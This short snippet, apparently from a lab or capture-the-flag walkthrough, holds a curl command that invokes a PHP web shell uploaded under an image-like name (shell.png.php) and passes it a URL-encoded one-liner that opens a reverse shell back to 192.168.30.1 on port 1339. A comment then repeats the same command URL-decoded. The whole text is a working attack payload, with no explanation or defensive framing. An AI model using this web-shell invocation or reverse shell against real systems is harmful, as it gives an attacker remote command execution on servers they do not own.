curl "http://travel.rogue-sentinels.io/salmon-uploads/shell.png.php?cmd=php%20-r%20'%24sock%3dfsockopen(%22192.168.30.1%22,1339);exec(%22/bin/sh%20%3c%263%20%3e%263%202%3e%263%22);'"

# curl "http://travel.rogue-sentinels.io/salmon-uploads/shell.png.php?cmd=php -r '$sock=fsockopen('192.168.30.1',1339);exec("/bin/sh <&3 >&3 2>&3");'" (url decoded for clarity)